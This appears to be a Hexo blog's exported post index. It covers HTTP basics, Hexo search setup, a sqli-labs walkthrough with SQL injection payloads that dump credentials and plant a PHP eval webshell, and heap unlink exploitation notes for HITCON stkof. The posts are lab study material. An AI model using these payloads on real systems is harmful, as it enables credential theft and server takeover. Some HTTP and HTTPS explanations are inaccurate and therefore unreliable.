<li>Transfer-Encoding：报文主体的传输编码方式</li>
</ul>
</li>
<li><strong>请求首部字段（请求报文会使用的首部字段）</strong>
<ul>
<li>Host：请求资源所在服务器</li>
<li>Accept：可处理的媒体类型</li>
<li>Accept-Charset：可接收的字符集</li>
<li>Accept-Encoding：可接受的内容编码</li>
<li>Accept-Language：可接受的自然语言</li>
</ul>
</li>
<li><strong>响应首部字段（响应报文会使用的首部字段）</strong>
<ul>
<li>Accept-Ranges：可接受的字节范围</li>
<li>Location：令客户端重新定向到的URI</li>
<li>Server：HTTP服务器的安装信息</li>
</ul>
</li>
<li><strong>实体首部字段（请求报文与响应报文的的实体部分使用的首部字段）</strong>
<ul>
<li>Allow：资源可支持的HTTP方法</li>
<li>Content-Type：实体主类的类型</li>
<li>Content-Encoding：实体主体适用的编码方式</li>
<li>Content-Language：实体主体的自然语言</li>
<li>Content-Length：实体主体的的字节数</li>
<li>Content-Range：实体主体的位置范围，一般用于发出部分请求时使用</li>
</ul>
</li>
</ul>
<h2 id="https工作原理"><a class="markdownIt-Anchor" href="#https工作原理"></a> HTTPS工作原理</h2>
<ul>
<li>一、首先HTTP请求服务端生成证书，客户端对证书的有效期、合法性、域名是否与请求的域名一致、证书的公钥（RSA加密）等进行校验；</li>
<li>二、客户端如果校验通过后，就根据证书的公钥的有效， 生成随机数，随机数使用公钥进行加密（RSA加密）；</li>
<li>三、消息体产生的后，对它的摘要进行MD5（或者SHA1）算法加密，此时就得到了RSA签名；</li>
<li>四、发送给服务端，此时只有服务端（RSA私钥）能解密。</li>
<li>五、解密得到的随机数，再用AES加密，作为密钥（此时的密钥只有客户端和服务端知道）。</li>
</ul>
<h2 id="一次完整的http请求"><a class="markdownIt-Anchor" href="#一次完整的http请求"></a> 一次完整的HTTP请求</h2>
<p>HTTP通信机制是在一次完整的HTTP通信过程中，Web浏览器与Web服务器之间将完成下列7个步骤：</p>
<ul>
<li>建立TCP连接</li>
</ul>
<p>在HTTP工作开始之前，Web浏览器首先要通过网络与Web服务器建立连接，该连接是通过TCP来完成的，该协议与IP协议共同构建 Internet，即著名的TCP/IP协议族，因此Internet又被称作是TCP/IP网络。<strong>HTTP是比TCP更高层次的应用层协议，根据规则， 只有低层协议建立之后才能，才能进行更层协议的连接，因此，首先要建立TCP连接，一般TCP连接的端口号是80。</strong></p>
<ul>
<li>Web浏览器向Web服务器发送请求行</li>
</ul>
<p>一旦建立了TCP连接，<strong>Web浏览器就会向Web服务器发送请求命令</strong>。例如：GET /sample/hello.jsp HTTP/1.1。</p>
<ul>
<li>Web浏览器发送请求头
<ul>
<li>浏览器发送其请求命令之后，还要以头信息的形式向Web服务器发送一些别的信息，<strong>之后浏览器发送了一空白行来通知服务器</strong>，它已经结束了该头信息的发送。</li>
</ul>
</li>
<li>Web服务器应答
<ul>
<li>客户机向服务器发出请求后，服务器会客户机回送应答， <strong>HTTP/1.1 200 OK ，应答的第一部分是协议的版本号和应答状态码。</strong></li>
</ul>
</li>
<li>Web服务器发送应答头
<ul>
<li>正如客户端会随同请求发送关于自身的信息一样，服务器也会随同应答向用户发送关于它自己的数据及被请求的文档。</li>
</ul>
</li>
<li>Web服务器向浏览器发送数据
<ul>
<li>Web服务器向浏览器发送头信息后，它会发送一个空白行来表示头信息的发送到此为结束，接着，<strong>它就以Content-Type应答头信息所描述的格式发送用户所请求的实际数据</strong>。</li>
</ul>
</li>
<li>Web服务器关闭TCP连接
<ul>
<li>一般情况下，一旦Web服务器向浏览器发送了请求数据，它就要关闭TCP连接，然后如果浏览器或者服务器在其头信息加入了这行代码：</li>
</ul>
</li>
</ul>
<figure class="highlight armasm"><table><tr><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">Connection:</span><span class="hljs-meta">keep</span>-alive<br></code></pre></td></tr></table></figure>
<p>TCP连接在发送后将仍然保持打开状态，于是，浏览器可以继续通过相同的连接发送请求。保持连接节省了为每个请求建立新连接所需的时间，还节约了网络带宽。</p>
<p><strong>建立TCP连接-&gt;发送请求行-&gt;发送请求头-&gt;（到达服务器）发送状态行-&gt;发送响应头-&gt;发送响应数据-&gt;断TCP连接</strong></p>
<h2 id="常见的http相应状态码"><a class="markdownIt-Anchor" href="#常见的http相应状态码"></a> 常见的HTTP相应状态码</h2>
<ul>
<li>200：请求被正常处理</li>
<li>204：请求被受理但没有资源可以返回</li>
<li>206：客户端只是请求资源的一部分，服务器只对请求的部分资源执行GET方法，相应报文中通过Content-Range指定范围的资源。</li>
<li>301：永久性重定向</li>
<li>302：临时重定向</li>
<li>303：与302状态码有相似功能，只是它希望客户端在请求一个URI的时候，能通过GET方法重定向到另一个URI上</li>
<li>304：发送附带条件的请求时，条件不满足时返回，与重定向无关</li>
<li>307：临时重定向，与302类似，只是强制要求使用POST方法</li>
<li>400：请求报文语法有误，服务器无法识别</li>
<li>401：请求需要认证</li>
<li>403：请求的对应资源禁止被访问</li>
<li>404：服务器无法找到对应资源</li>
<li>500：服务器内部错误</li>
<li>503：服务器正忙</li>
</ul>
<h2 id="http11版本新特性"><a class="markdownIt-Anchor" href="#http11版本新特性"></a> HTTP1.1版本新特性</h2>
<ul>
<li>a、<strong>默认持久连接节省通信量</strong>，只要客户端服务端任意一端没有明确提出断开TCP连接，就一直保持连接，可以发送多次HTTP请求</li>
<li>b、<strong>管线化，客户端可以同时发出多个HTTP请求，而不用一个个等待响应</strong></li>
<li>c、<strong>断点续传</strong>
<ul>
<li><strong>实际上就是利用HTTP消息头使用分块传输编码，将实体主体分块传输。</strong></li>
</ul>
</li>
</ul>
<h2 id="http优化方案"><a class="markdownIt-Anchor" href="#http优化方案"></a> HTTP优化方案</h2>
<ul>
<li><strong>TCP复用：TCP连接复用是将多个客户端的HTTP请求复用到一个服务器端TCP连接上，而HTTP复用则是一个客户端的多个HTTP请求通过一个TCP连接进行处理。前者是负载均衡设备的独特功能；而后者是HTTP 1.1协议所支持的新功能，目前被大多数浏览器所支持。</strong></li>
<li><strong>内容缓存：将经常用到的内容进行缓存起来，那么客户端就可以直接在内存中获取相应的数据了。</strong></li>
<li><strong>压缩：将文本数据进行压缩，减少带宽</strong></li>
<li><strong>SSL加速（SSL Acceleration）：使用SSL协议对HTTP协议进行加密，在通道内加密并加速</strong></li>
<li><strong>TCP缓冲：通过采用TCP缓冲技术，可以提高服务器端响应时间和处理效率，减少由于通信链路问题给服务器造成的连接负担。</strong></li>
</ul>
<blockquote>
<p><em><strong>参考文章：<a href="https://blog.csdn.net/yicixing7/article/details/79320821">https://blog.csdn.net/yicixing7/article/details/79320821</a></strong></em></p>
</blockquote>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>web学习</tag>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo启用搜索功能(图片测试)</title>
    <url>/2020/09/25/phtest/</url>
    <content><![CDATA[<h1 id="hexo启用搜索功能"><a class="markdownIt-Anchor" href="#hexo启用搜索功能"></a> Hexo启用搜索功能</h1>
<p>1.首先在Hexo的根目录下执行以下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">npm install hexo-generator-searchdb --save <br></code></pre></td></tr></table></figure>
<p><img src="/2020/09/25/phtest/image-20210325172142569.png" alt="image-20210325172142569"></p>
<p>有WARN没关系，最后还是可以用的</p>
<p>2.在全局配置文件_config.yml，新增如下内容</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">search:</span><br>  <span class="hljs-attr">path:</span> <span class="hljs-string">search.xml</span><br>  <span class="hljs-attr">field:</span> <span class="hljs-string">post</span><br>  <span class="hljs-attr">format:</span> <span class="hljs-string">html</span><br>  <span class="hljs-attr">limit:</span> <span class="hljs-number">10000</span><br></code></pre></td></tr></table></figure>
<p>3.在主题配置文件_config.yml修改local_search为true</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">local_search:<br>    <span class="hljs-built_in">enable</span>: <span class="hljs-literal">true</span>```<br></code></pre></td></tr></table></figure>
<p>4.新建一个页面，命名为 search 。命令如下：</p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><code class="hljs haxe">hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> search<br></code></pre></td></tr></table></figure>
<p>5.编辑刚新建的页面，将页面的类型设置为 search</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">title</span>: search<br><span class="hljs-attribute">date</span>: <span class="hljs-number">2021</span>-<span class="hljs-number">03</span>-<span class="hljs-number">25</span> <span class="hljs-number">17</span>:<span class="hljs-number">09</span>:<span class="hljs-number">15</span><br><span class="hljs-attribute">type</span>: <span class="hljs-string">&quot;search&quot;</span><br></code></pre></td></tr></table></figure>
<p>6.执行hexo g和hexo d部署完成</p>
]]></content>
  </entry>
  <entry>
    <title>sqli labs master 学习</title>
    <url>/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="sqli-labs-master-学习"><a class="markdownIt-Anchor" href="#sqli-labs-master-学习"></a> sqli labs master 学习</h1>
<h2 id="less-1"><a class="markdownIt-Anchor" href="#less-1"></a> Less 1</h2>
<p>1.首先判断注入点</p>
<p>在http请求后加上？id=1’ and 1=1 – -，显示如下</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image002.jpg" alt="img"></p>
<p>把后面改为1=2显示如下，可以看到sql语句应该是正常执行了，没有报错</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image004.jpg" alt="img"></p>
<p>可以说明存在字符型注入，猜测语句为select… where id=’’这样的语句。</p>
<p>接下来判断注入点</p>
<p>判断字段数</p>
<p>输入?id=1’ order by 3 – -时候会显示如下，说明内部字段数为3</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image006.jpg" alt="img"></p>
<p>输入?id=0’ union select 1,2,3 – -回显如下</p>
<p>（id为0是为了不让返回值干扰注入）</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image008.jpg" alt="img"></p>
<p>说明2,3的位置存在注入点</p>
<p>使用联合查询注入查看表，输入?id=0’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() – -回显如下</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image010.jpg" alt="img"></p>
<p>得到emails,referers,uagents,users这几个表</p>
<p>查询字段，输入?id=0’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=‘users’ – -回显如下</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image012.jpg" alt="img"></p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image014.jpg" alt="img"></p>
<p>发现里面有username，password字段，可以尝试查询这个列里的值，输入?id=0’ union select 1,group_concat(username,0x3f,password),3 from users-- -</p>
<p>0x3f是？的ascii码值，放在中间作为参数好区分两个列的值</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image016.jpg" alt="img"></p>
<h2 id="less-2"><a class="markdownIt-Anchor" href="#less-2"></a> Less 2</h2>
<p>首先查看注入类型，输入?id=1 and 1=1 – -回显如下</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image072.jpg" alt="img"></p>
<p>输入?id=1 and 1=2 – -回显如下</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image074.jpg" alt="img"></p>
<p>说明存在数字型注入，之后步骤同less1，输入的代码相同，如下</p>
<p>判断注入点，输入?id=1 order by 3 – -</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_imag06.jpg" alt="img"></p>
<p>回显如下，说明回显字段数为3，之后步骤同less1，可以使用less1的注入代码去掉前面单引号即可</p>
<p>最后输入输入?id=0 union select 1,group_concat(username,0x3f,password),3 from users-- -得到用户名和密码</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image708.jpg" alt="img"></p>
<h2 id="less-3"><a class="markdownIt-Anchor" href="#less-3"></a> Less 3</h2>
<p>先输入?id=1’，显示如下，根据报错信息，可以知道后面还有个括号，所以尝试输入?id=1’) and 1=1 – -</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image22.jpg" alt="img"></p>
<p>输入?id=1’) and 1=1 – -回显如下</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image044.jpg" alt="img"></p>
<p>说明存在基于字符’)的字符型注入</p>
<p>输入?id=1’) order by 3 – -回显如下，说明返回数据有3个字段</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_imaw006.jpg" alt="img"></p>
<p>后面输入同less1，将less1的语句改为id=1’)即可</p>
<p>最后输入?id=0 union select 1,group_concat(username,0x3f,password),3 from users-- -得到用户名和密码列对应的数值</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_ima008.jpg" alt="img"></p>
<h2 id="less-4"><a class="markdownIt-Anchor" href="#less-4"></a> Less 4</h2>
<p>输入?id=1’但是页面无变化</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_i.jpg" alt="img"></p>
<p>输入?id=1&quot;页面报错如下，猜测可能是双引号加）</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_ima.jpg" alt="img"></p>
<p>输入?id=1&quot;) order by 4 – -发现回显如下，说明我们的判断可能是对的</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_imag76.jpg" alt="img"></p>
<p>输入?id=1&quot;) order by 3 – -回显正常说明有3个字段</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_ie008.jpg" alt="img"></p>
<p>之后注入代码同less1，id后面改为&quot;)其他同，最后得到用户名和密码的列内容为</p>
<p>输入</p>
<p>?id=0&quot;) union select 1,group_concat(username,0x3f,password),3 from users-- -得到用户名和密码列对应的数值</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_im.jpg" alt="img"></p>
<h2 id="less-5"><a class="markdownIt-Anchor" href="#less-5"></a> Less 5</h2>
<p>首先查询id=1，但是发现不会返回任何数据，只会返回you are in……</p>
<p>如果输入别的，就会报错</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image34.jpg" alt="img"></p>
<p>输入?id=1’ and 1=1 – -未报错，说明sql查询语句可能同less1使用‘号闭合</p>
<p>输入?id=1’ order by 3 – -，回显正常，说明字段数为3</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_ima344.jpg" alt="img"><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_imageqew.jpg" alt="img"></p>
<p>使用报错注入查询数据库名，输入?id=0’union select count(*),1, concat(’~’,(select database()),’~’,floor(rand()*2)) as a from information_schema.tables group by a – -</p>
<p>原理：利用concat（）连接函数和随机数函数floor(rand()*2)的结果只能在0-1来产生报错，使用information_schema.tables 或 information_schema.columns者两个表来查询，然后就会产生很多结果达到报错concat函数加~号是为了能更好看清楚查询到的数据库</p>
<p>效果如下：可以知道查询到的数据库名是security</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_im0.jpg" alt="img"></p>
<p>查询表名，输入</p>
<p>?id=0’ union select count(*),1, concat(’~’,(select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1),’~’,floor(rand()*2)) as a from information_schema.tables group by a – -</p>
<p>从0开始输入到4的时候（limit 3，1前的数3表示第几个表），回显如下</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_im10.jpg" alt="img"></p>
<p>说明数据库中第四个表为user</p>
<p>查询列字段名，输入?id=0’ union select count(*),1, concat(’~’,(select column_name from information_schema.columns where table_schema=‘security’ and table_name=‘users’ limit 0,1),’~’, floor(rand()*2)) as a from information_schema.tables group by a – -</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_im1.jpg" alt="img"></p>
<p>说明表中第一个列的字段是id，同理可以找到username、password等字段</p>
<p>接下来查询内容，输入?id=0’ union select count(*),1, concat(’~’,( select username from users limit 1,1),’~’, floor(rand()*2)) as a from information_schema.tables group by a – -</p>
<p>和</p>
<p>?id=0’ union select count(*),1, concat(’~’,( select password from users limit 1,1),’~’, floor(rand()*2)) as a from information_schema.tables group by a – -</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image088.jpg" alt="img"></p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image8016.jpg" alt="img"></p>
<p>可以查找到Angelina的用户名和密码，查找其他账号密码方式同上</p>
<h2 id="less-6"><a class="markdownIt-Anchor" href="#less-6"></a> Less 6</h2>
<p>输入id=1回显如下，说明还是通过布尔值来判断注入</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image3002.jpg" alt="img"></p>
<p>尝试输入?id=1’，回显如下</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image0044.jpg" alt="img"></p>
<p>输入?id=1&quot;报错如下</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image00634.jpg" alt="img"></p>
<p>说明存在双引号的注入</p>
<p>使用报错注入查询数据库名，输入?id=0” union select count(*),1, concat(’~’,(select database()),’~’,floor(rand()*2)) as a from information_schema.tables group by a – -</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_imag32e008.jpg" alt="img"></p>
<p>可以通过报错注入回显出结果，其他步骤和payload同less5，使用less5的注入代码，并且把id=0后的单引号改为双引号即可</p>
<p>最后查询表中内容输入如下</p>
<p>接下来查询内容，输入?id=0&quot;union select count(*),1, concat(’~’,( select username from users limit 1,1),’~’, floor(rand()*2)) as a from information_schema.tables group by a – -</p>
<p>和</p>
<p>?id=0&quot; union select count(*),1, concat(’~’,( select password from users limit 1,1),’~’, floor(rand()*2)) as a from information_schema.tables group by a – -</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image01045.jpg" alt="img"></p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image01223.jpg" alt="img"></p>
<h2 id="less-7"><a class="markdownIt-Anchor" href="#less-7"></a> Less 7</h2>
<p>输入?id=1,?id=1’,?id=1&quot;测试注入点，当输入id=1’的时候报错，显示如下，说明存在单引号字符型注入</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image01124.jpg" alt="img"></p>
<p>输入?id=1’ and 1=1 – - 报错，显示如下，说明可能存在括号</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image01326.jpg" alt="img"></p>
<p>测试有多少个括号，最后输入?id=1’ )) and 1=1 – -未报错，显示如下，说明得需要2个括号闭合</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image011238.jpg" alt="img"></p>
<p>提示我们得使用outfile函数导出文件，然而这个函数是有要求的，首先我们得知道绝对的文件物理路径，还得对这个路径有可写入的权限</p>
<p>在地址栏输入</p>
<p>?id=1’)) union select 1,2,’<?php @eval($_POST["cmd"]);?>’ into outfile “D:\phpstudy_pro\WWW\sqli-labs-master\Less-7”-- -</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image04220.gif" alt="img"></p>
<p>可以看到这个路径确实写入了我们的一句话木马，然后用菜刀连接</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image02322.gif" alt="img"></p>
<p>这时可以连接上并且可以对文件进行操作了</p>
<h2 id="less-8"><a class="markdownIt-Anchor" href="#less-8"></a> Less 8</h2>
<p>输入?id=1，回显如下</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image02302.jpg" alt="img"></p>
<p>可以说明是布尔型注入，输入?id=1’没有回显，说明可能是基于单引号的布尔注入</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image00%E4%B8%BA4.jpg" alt="img"></p>
<p>尝试使用报错注入的时候没有回显，所以我们不能用报错注入。尝试时间盲注</p>
<p>输入?id=1’ and if(length(database())=8,sleep(5),1)-- -</p>
<p>*这里不正确执行select 1页面正常返回，正确则执行select sleep(5)页面沉睡5秒后返回</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image00r36.jpg" alt="img"></p>
<p>有明显延迟，说明数据库长度为8，接下来爆破库名</p>
<p>?id=1’and if(ascii(substr(database(),1,1))=115,sleep(5),1)-- -</p>
<p>如下图，有明显延迟，说明库的第一个字符acii码为115（s）</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image0sd208.jpg" alt="img"></p>
<p>其他字段调整(substr(database(),x,1)中x大小得出数据库名字是’security’</p>
<p>接下来爆破表的内容</p>
<p>?id=1’and if(ascii(substr((select table_name from information_schema.tables where table_schema=‘security’ limit 3,1),1,1))=117 ,sleep(5),1)-- -</p>
<p>这里limit x,1),y,1)的x表示第x+1个表，y表示表名第y位数，用ASCII码判断</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image0102.jpg" alt="img"></p>
<p>延迟明显说明猜测正确，这里最后得出第三个表是user表</p>
<p>接下来爆表中的名字，输入</p>
<p>?id=1’and if(ascii(substr((select column_name from information_schema.columns where table_name=‘users’ limit 3,1),1,1))=105, sleep(5),1)-- -</p>
<p>这里limit x,1),y,1)的x表示第x+1列，y表示列名第y位数，用ASCII码判断</p>
<p>然后爆破列的内容用</p>
<p>?id=1’and if(ascii(substr((select username from users limit 0,1),1,1))=68, sleep(5),1) – -</p>
<p>这里limit x,1),y,1)的x表示第x+1个内容，y表示内容的第y位数，用ASCII码判断</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image01342.jpg" alt="img"></p>
<p>请求有明显延迟则判断成功</p>
<h2 id="less-9"><a class="markdownIt-Anchor" href="#less-9"></a> Less 9</h2>
<p>这里不管输入什么，下图输入1或者1’，回显总是You are in…</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image32014.jpg" alt="img"><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_imag3e016.jpg" alt="img"></p>
<p>题目提示是基于时间的盲注，经过尝试，当输入?id=1’ and sleep(5) – -延迟明显，说明注入成功</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_23image018.jpg" alt="img"></p>
<p>由于我们上一关就是使用的时间盲注，所以直接用上一题的payload</p>
<p>输入?id=1’ and if(length(database())=8,sleep(5),1)-- -，查询数据库长度</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image3020.jpg" alt="img"></p>
<p>延迟明显，说明可以注入，之后操作同less8</p>
<h2 id="less-10"><a class="markdownIt-Anchor" href="#less-10"></a> Less 10</h2>
<p>这里和上一关一样，不管输入什么都会显示you are in….，通过测试，当输入?id=1&quot; and sleep(5) – -时，延迟明显，说明存在双引号注入</p>
<p><img src="/2021/05/11/sqli-labs-master-%E5%AD%A6%E4%B9%A0/clip_image123022.jpg" alt="img"></p>
]]></content>
      <categories>
        <category>web学习</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>web学习</tag>
      </tags>
  </entry>
  <entry>
    <title>unlink漏洞学习</title>
    <url>/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="堆的unlink漏洞学习"><a class="markdownIt-Anchor" href="#堆的unlink漏洞学习"></a> 堆的unlink漏洞学习</h1>
<h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2>
<p>做实验做到的堆部分，第一个就是这个，以前没怎么详细做过堆的题，理解起来真的困难，看了几天才能理解，还是太菜了。就决定要把这个记录下来TAT</p>
<h2 id="unlink基本原理"><a class="markdownIt-Anchor" href="#unlink基本原理"></a> Unlink基本原理</h2>
<p>Unlink的目的是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并）。其基本的过程如下</p>
<img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/unlink.png" alt="unlink基本原理" style="zoom:67%;">
<p>目的是为了把图中的P拿出来，然后使FD-&gt;bk=BK 以及BK-&gt;fd=FD，其实这里说的也已经很清楚<a href="https://wiki.x10sec.org/pwn/linux/glibc-heap/unlink-zh/#_2">CTF wiki unlink</a>，不过我就是不明白unlink的一个检查机制</p>
<p>双向链表指针破坏：前一个块的 fd 和下一个块的 bk 应该指向当前 unlink</p>
<p>块。当攻击者使用 free -12 和 shellcode 地址覆</p>
<p>盖 fd 和 bk 时， free 和 shellcode 地址 + 8 就不会指向当前 unlink 块</p>
<p>（ second ）。因此 glibc malloc 就抛出双向链表指针破坏错误。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))<br><span class="hljs-built_in">malloc_printerr</span> (check_action, <span class="hljs-string">&quot;corrupted double-linked</span><br><span class="hljs-string">list&quot;</span>, P); <br></code></pre></td></tr></table></figure>
<p>以及这个机制的绕过，这个机制主要是验证p-&gt; fd-&gt; bk == p 和 p-&gt; bk-&gt; fd == p</p>
<p>绕过主要是令伪造堆快的fd=这个堆快的指针位置-3*偏移，以及bk=这个堆快的指针位置-2*偏移</p>
<p>这个看得我真的很绕，一时间理解不能，还是太菜了（还有就是这类题都会有个全局指针？）</p>
<p>不过做了一道题后理解就很清楚了，果然不能光看。</p>
<h2 id="2014-hitcon-stkof"><a class="markdownIt-Anchor" href="#2014-hitcon-stkof"></a> 2014 HITCON stkof</h2>
<p>程序开启了canary和堆栈不可执行保护</p>
<img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213154332.png" alt="检查" style="zoom:67%;">                       
<p>程序运行后没有什么显示，但是根据ida查看可以知道，程序有3个功能</p>
<img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213239564.png" alt="运行" style="zoom:67%;">
<p>输入1是申请堆块，然后输入大小，这里注意有一个全局变量，每次申请的内存地址都存放在这个全局变量中</p>
 <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213308210.png" alt="输入1的函数" style="zoom:67%;">
<p>输入2是编辑堆块，先输入目录号，然后输入长度，再输入内容</p>
 <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213349366.png" alt="输入2的函数" style="zoom:67%;">
<p>输入3是进行free的操作</p>
 <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213416269.png" alt="输入3的操作" style="zoom:67%;">
<p><strong>注意这里所有操作都是通过全局变量指针s来进行的</strong></p>
<h3 id="利用思路"><a class="markdownIt-Anchor" href="#利用思路"></a> 利用思路</h3>
<ol>
<li>
<p>首先创建4个堆块，3号堆块必须不是fastbin，不然不会向前合并，然后在2号堆块伪造chunk，令fd=chunk2的全局变量指针-0x18，bk= chunk2的全局变量指针-0x10</p>
</li>
<li>
<p>在第二个堆块中伪造fake chunk，然后free第三个堆块进行unlink，unlink操作会把伪造堆块的fd写入原来全局变量的chunk2的指针处。</p>
</li>
<li>
<p>这时候修改chunk2，因为chunk2的指针是就等于修改chunk2的全局变量指针-0x18处的值。</p>
</li>
<li>
<p>编辑chunk2（也就是chunk2的全局变量指针-0x18）开始编辑，把free的got表覆盖全局变量的chunk1指针处，然后通过编辑功能修改chunk1指针（也就是free的got表）为put的plt表，然后free掉chunk2，就可以泄露处put的真实地址，然后计算system和bin/sh的真实地址</p>
</li>
<li>
<p>最后把free的got表覆盖为system的地址，然后编辑chunk4中为/bin/sh的地址，然后free掉chunk4，触发system（/bin/sh）即可完成利用</p>
</li>
</ol>
<h3 id="攻击过程"><a class="markdownIt-Anchor" href="#攻击过程"></a> 攻击过程</h3>
<p>首先创建4个堆块，大小分别为0x20，0x30，0x80，0x20，堆块3不能是fastbin，否则不能触发合并。</p>
 <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213459651.png" alt="创建堆快" style="zoom:67%;">
<p>查看全局变量s的位置，4个堆块的指针都记录在上面</p>
 <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213531336.png" alt="全局变量查看" style="zoom:67%;">
<p>然后修改chunk2伪造堆块</p>
 <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213556648.png" alt="伪造的chunk2" style="zoom:67%;">
